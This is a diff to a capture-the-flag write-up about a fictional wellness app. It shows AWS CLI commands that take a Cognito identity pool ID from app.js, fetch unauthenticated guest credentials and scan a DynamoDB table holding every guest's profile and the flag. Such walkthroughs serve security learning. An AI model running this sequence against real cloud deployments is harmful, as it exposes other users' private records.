@@ -23,11 +23,11 @@ comments: false
 
 ---
 
-# Access to website and inspect
+## Access the website and inspect
 
 ![image-1361](/assets/img/obsidian/complimentary/image-1361.png)
 
-It contain `app.js` which is source code of web application.
+It contains `app.js`, which is the source code of the web application.
 
 ```js
 // Byte Lotus Wellness — guest dashboard
@@ -92,12 +92,18 @@ AWS.config.credentials.get(function (err) {
 ```
 
 
+## Guest Credentials
+
+From `app.js`, we can see the Cognito pool ID, AWS region and DynamoDB table name. The app requests guest credentials without a login, so let's check what those credentials allow us to read.
+
 ```bash
 aws cognito-identity get-id \
 --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688" \
 --region us-east-1
 ```
 
+
+First, get an identity from the pool, then use the returned identity ID to request temporary credentials. The identity ID is different from the pool ID.
 
 ```bash
 aws cognito-identity get-credentials-for-identity \
@@ -114,7 +120,7 @@ export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretKey' creds.json)
 export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
 ```
 
-export to set environment variable in shell.
+export to set environment variables in the shell.
 
 
 ```bash
@@ -123,6 +129,10 @@ aws sts get-caller-identity --region us-east-1
 
 ![image-1367](/assets/img/obsidian/complimentary/image-1367.png)
 
+This confirms the credentials work, and we are using the guest role `complimentary-cognito-unauth-role`. Next, let's try reading the table directly.
+
+## Read Guest Profiles
+
 ```bash
 aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
 ```
@@ -130,9 +140,11 @@ aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-e
 
 ![image-1368](/assets/img/obsidian/complimentary/image-1368.png)
 
-It reveal every single guess profiles
+It reveals every single guest's profile
 
 ![image-1369](/assets/img/obsidian/complimentary/image-1369.png)
+
+The `guest-vip-042` profile has the flag in its notes. So, the guest role can read other guests' records too.
 
 And there is the flag!
 
